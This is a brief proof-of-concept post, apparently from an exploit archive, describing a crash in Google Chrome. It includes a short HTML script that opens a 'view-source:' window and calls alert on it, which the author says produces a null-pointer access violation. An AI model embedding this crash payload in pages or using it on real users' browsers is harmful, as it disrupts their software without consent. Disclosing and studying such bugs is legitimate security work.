another proof of concept of how to break the google chrome, there is not much detail in reality.       
                                                                                                       
the result of error in ollydbg is:                                                                     
                                                                                                       
Access violation when reading [00000000]                                                               
                                                                                                       
nigun effect obviously does not cause "dangerous" but it is a curiosity.                               
                              

POC:

                                                                                                       
<script>                                                                                               
a = window.open("view-source:http://123")                                                              
a.alert(1)                                                                                             
</script>
